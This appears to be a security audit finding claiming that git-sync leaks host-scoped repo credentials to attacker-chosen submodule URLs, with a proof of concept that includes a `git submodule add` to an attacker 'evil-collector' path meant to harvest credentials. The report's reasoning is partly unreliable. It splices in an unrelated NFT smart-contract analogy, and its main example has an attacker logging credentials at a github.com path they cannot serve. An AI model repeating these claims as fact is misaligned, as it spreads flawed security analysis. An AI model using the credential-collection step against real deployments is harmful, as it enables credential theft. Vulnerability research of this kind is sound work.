### Title
Repo-scoped git credentials (username/password, askpass-url secret, GitHub App token) are leaked to attacker-controlled submodule URLs on the same host - (File: main.go)

### Summary
`git-sync` stores all fetched credentials (static username/password, `--askpass-url` results, and short-lived GitHub App installation tokens) via a single call to `git credential approve` scoped only to the top-level `--repo` URL, and then unconditionally runs `git submodule update --init --recursive` against whatever `.gitmodules` content is present in the synced commit. Because git's default HTTP credential matching is per protocol+host (not per full path, unless `credential.useHttpPath` is set, which git-sync never sets), any submodule URL that shares the same scheme+host as `--repo` will also receive the credential that was approved for the main repo. An attacker who can get a malicious commit synced (a `.gitmodules` pointing a submodule at an attacker-controlled path on the same host) can make git-sync send the victim's real repo credentials to the attacker's endpoint.

### Finding Description
`StoreCredentials` approves a credential keyed on `git.repo` only, and is used for every non-SSH auth mode: [1](#0-0) 

This is invoked for `--credential` entries (each with its own explicit URL, which is safe) but critically also for the primary repo auth flow: the static `--username`/`--password(-file)` refresh path re-approves against `git.repo` implicitly through the initial setup, the askpass-url flow stores the fetched secret against `git.repo`: [2](#0-1) 

and the GitHub App flow stores its short-lived installation access token against `git.repo` as well: [3](#0-2) 

In addition, git-sync layers an in-memory `credential.helper cache` on top, which by default matches the same way (protocol+host): [4](#0-3) 

None of these paths set `credential.useHttpPath`, so git's credential subsystem will offer the stored (or cached) username/password/token to **any** URL with the same scheme and host as `git.repo` — including a submodule URL.

After fetching the main repo, `configureWorktree` unconditionally recurses into submodules (default `--submodules=recursive`) using content that came from the synced commit itself, i.e. attacker-controlled if the attacker can push a commit/ref that git-sync tracks: [5](#0-4) 

Because `.gitmodules` (and its submodule URLs) is ordinary repository content, an attacker with push/PR access to any ref git-sync syncs (or who controls a branch/tag that is later pointed to by `--ref`) can add/modify a submodule whose URL points to a different path on the same host as `--repo` (e.g. `https://github.com/attacker/evil-collector` next to `https://github.com/victim-org/private-repo`), and control a server there to receive the leaked credential.

This is the git-sync analog of the Caviar `PrivatePool` bug class: an authorization grant (`git credential approve` / cached credential) was scoped too broadly (by host, not by full destination) and gets involuntarily "farmed" and redirected to an unintended, attacker-chosen recipient (a malicious submodule URL) that the credential owner never intended to authorize, exactly as the stale/broad NFT+token approvals in `PrivatePool` were reused by an unintended party via `flashLoan`/`execute`.

### Impact Explanation
Successful exploitation discloses the real git credentials (static username/password, the secret returned from `--askpass-url`, or the live GitHub App installation access token) to an attacker-controlled HTTP(S) endpoint. Depending on scope, this token/password can be used to read (or, if scope permits, write) private repository content, i.e. credential/token disclosure with follow-on unauthorized repository access — one of the explicitly in-scope impact categories.

### Likelihood Explanation
Requires: (1) HTTP(S) transport with username/password, `--askpass-url`, or GitHub App auth (not SSH, not `--credential`-only setups, not `--submodules=off`); (2) the attacker being able to get a commit/ref containing a crafted `.gitmodules` synced by the victim's git-sync instance (e.g. attacker has push rights to some branch/PR that is or becomes the tracked `--ref`, or the tracked repo accepts external contributions); (3) a submodule URL chosen to be same-host as `--repo` (trivially satisfiable on multi-tenant hosts like `github.com`, `gitlab.com`, internal Git servers, etc.). This is a realistic scenario for shared hosting providers and for any workflow where git-sync tracks a ref that isn't fully trusted (forks, PR branches, mirrors of less-trusted upstreams).

### Recommendation
- Set `credential.useHttpPath=true` (or otherwise scope credential storage/matching to the exact `--repo` URL including path) so credentials are never offered to submodule/other-path URLs on the same host.
- Alternatively/additionally, disable submodule credential inheritance by default, or require the user to explicitly opt in per-submodule-URL credentials (as `--credential` already supports), refusing to use the primary repo credential for any URL other than an exact match of `--repo`.
- Document/warn that `--submodules=recursive` combined with `--username`/`--password`, `--askpass-url`, or GitHub App auth against a multi-tenant host is unsafe unless `credential.useHttpPath` is enabled.

### Proof of Concept
1. Configure git-sync against a private repo on a shared host using non-`--credential` auth, e.g.:
   ```
   git-sync --repo=https://github.com/victim-org/private-repo \
            --username=svc-account --password-file=/secrets/pass \
            --root=/git --submodules=recursive
   ```
   This stores the credential scoped to host `github.com` (no path restriction) — see `StoreCredentials` at [1](#0-0) .
2. Attacker, having push access to some branch/PR of `victim-org/private-repo` (or a fork that becomes the sync target), adds:
   ```
   git submodule add https://github.com/attacker/evil-collector sub
   ```
   and gets this commit synced.
3. On the next sync, `configureWorktree` runs `git submodule update --init --recursive`, at [5](#0-4) , which performs an HTTP(S) fetch against `https://github.com/attacker/evil-collector`. Because the credential was approved/cached for host `github.com` without path scoping, git offers the victim's `svc-account`/`pass` (or askpass secret / GitHub App token) to the attacker's endpoint, which the attacker (running their own git server) logs and exfiltrates.

```go
// StoreCredentials stores a username and password for later use.
func (git *repoSync) StoreCredentials(ctx context.Context, url, username, password string) error {
	git.log.V(1).Info("storing git credential", "url", redactURL(url))
	git.log.V(9).Info("md5 of credential", "url", url, "username", md5sum(username), "password", md5sum(password))

	creds := fmt.Sprintf("url=%v\nusername=%v\npassword=%v\n", url, username, password)
	_, _, err := git.RunWithStdin(ctx, "", creds, "credential", "approve")
	if err != nil {
		return fmt.Errorf("can't configure git credentials: %w", err)
	}

	return nil
}
```
